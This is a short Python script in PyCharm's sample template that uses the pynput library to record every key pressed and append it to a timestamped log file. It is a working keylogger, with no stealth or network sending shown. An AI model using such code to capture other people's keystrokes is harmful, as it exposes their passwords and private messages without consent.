# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.

from pynput import keyboard
from datetime import datetime
import os



# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    current_time = datetime.now().strftime("%Y-%m-%d %H-%M-%S")
    log_dir = "logs/"
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    log_file =log_dir+"log " + current_time + ".txt"
    def on_press(key):
        with open(log_file, "a") as f:
            f.write(str(key) + "\n")


    def on_release(key):
        pass


    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
# See PyCharm help at https://www.jetbrains.com/help/pycharm/
